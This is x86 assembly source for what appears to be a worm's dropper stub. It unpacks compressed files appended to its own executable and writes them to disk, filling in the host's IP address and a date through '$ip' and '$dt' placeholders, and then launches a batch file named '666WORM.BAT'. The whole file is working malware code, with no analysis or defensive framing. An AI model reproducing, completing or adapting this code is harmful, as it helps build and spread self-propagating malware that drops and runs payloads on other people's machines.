.586
.model flat
locals

include header.inc
include socket.inc

OUR_SIZE EQU 2560

.data
runname      db "666WORM.BAT",0
format       db "%d/%d/%d",0

.data?
run_bat_file dd ?
patch_output dd ?
filename     db MAX_PATH dup (?)

.code

main:
        sub ebp,ebp
        mov esi,ebp

        callW GetCommandLineA
        xchg eax,esi

  @@seek:
        lodsb
        test al,al
        jz @@done
        sub al, "!"
        jnz @@seek
        inc eax
  @@done:
        mov [run_bat_file],eax

        mov ebx,ofs filename
        push MAX_PATH
        push ebx
        push ebp
        callW GetModuleFileNameA

        push ebp
        push FILE_ATTRIBUTE_NORMAL
        push OPEN_EXISTING
        push ebp
        push FILE_SHARE_READ
        push GENERIC_READ
        push ebx
        callW CreateFileA
        mov ebx,eax
        inc eax
        jz @@error

        push ebp
        push ebx
        callW GetFileSize
        xchg edi,eax

        push edi
        push 40h
        callW GlobalAlloc
        mov esi,eax
        test eax,eax
        jz @@close_error

        push ebp
        mov eax,esp

        push ebp
        push eax
        push edi
        push esi
        push ebx
        callW ReadFile

        pop eax

  @@close_error:
        push ebx
        callW CloseHandle

        test esi,esi
        jz @@error

        add esi,OUR_SIZE

  @@unpack_loop:
        mov eax,ebp
        lodsb
        test al,al
        jz @@done_unpack

        mov ebx,esi
        add esi,eax
        xchg [esi-1],ah
        movzx eax,ah
        mov [patch_output],eax

	mov eax,[esi+4]
	add eax,1024*16
        push eax
        push 40h
        callW GlobalAlloc
        test eax,eax
        jz @@error
        xchg edi,eax

        call z_decode_asm

        mov ecx,[patch_output]
        jecxz @@no_patch

        pushad

        mov eax,[esi+4]
        add eax,1024
        push eax
        push 40h
        callW GlobalAlloc

        mov ecx,[esi+4]
        xchg edi,eax
        xchg eax,esi
        push edi

  @@patch_loop:
        lodsb
        cmp al,"$"
        jne @@copy
        sub ecx,3
        lodsw
        cmp ax,"pi"
        jne @@noip
        call insert_ip
        jmp @@patch_loop
  @@noip:
        cmp ax,"td"
        jne @@patch_loop
        call insert_date
        jmp @@patch_loop
  @@copy:
        stosb
        loop @@patch_loop

        push dwo [esp.Pushad_edi+4]
        callW GlobalFree

        pop eax
        mov [esp.Pushad_edi],eax
        sub edi,eax
        mov eax,[esp.Pushad_esi]
        mov [eax+4],edi

        popad

  @@no_patch:
        push ebp
        push FILE_ATTRIBUTE_NORMAL
        push OPEN_ALWAYS
        push ebp
        push ebp
        push GENERIC_WRITE
        push ebx
        callW CreateFileA
        mov ebx,eax
        inc eax
        jz @@unpack_loop

        push ebp
        mov eax,esp

        push ebp
        push eax
        push dwo [esi+4]
        push edi
        push ebx
        callW WriteFile
        pop eax

        push ebx
        callW CloseHandle

        push edi
        callW GlobalFree

        add esi,[esi]
        jmp @@unpack_loop

  @@done_unpack:
        mov eax,[run_bat_file]
        test eax,eax
        jnz @@error

        push 16
        pop ecx
  @@lpush:
        push ebp
        loop @@lpush
        push 17*4
        mov eax,esp
        push ebp
        push ebp
        push ebp
        push ebp
        push esp
        push eax
        push ebp
        push ebp
        push ebp
        push TRUE
        push ebp
        push ebp
        push ofs runname
        push ebp
        callW CreateProcessA
        add esp,17*4+4*4

  @@error:
        push ebp
        callW ExitProcess

include z_decode.inc

insert_ip:
        pushad

        mov ebx,300h
        sub esp,ebx
        mov esi,esp

        push esp
        push 1
        callW WSAStartup

        push ebx
        push esi
        callW gethostname

        push esi
        callW gethostbyname
        test eax,eax
        jz @@output
        mov eax,[eax.h_list]
        test eax,eax
        jz @@output
        mov eax,[eax]
        test eax,eax
        jz @@output
        mov eax,[eax]

  @@output:
        push eax
        callW inet_ntoa
        xchg esi,eax

  @@cpy:
        lodsb
        test al,al
        jz @@done
        stosb
        jmp @@cpy
  @@done:
        callW WSACleanup

        add esp,ebx
        mov [esp.Pushad_edi],edi
        popad
        ret

insert_date:
        pushad
        mov ebx,300h
        sub esp,ebx

        push esp
        callW GetSystemTime

        movzx eax,wo [esp+0]		;ano
        movzx edx,wo [esp+6]		;dia
        movzx ecx,wo [esp+2]		;mes

        dec edx
        jnz @@done
	mov dl,28
	dec ecx
        jnz @@done
	mov cl,12
	dec eax
  @@done:

        push eax
        push edx
        push ecx
        push ofs format
        push edi
        callW _wsprintfA
        add esp,4*5

        add esp,ebx
        add [esp.Pushad_edi],eax
        popad
        ret

end     main

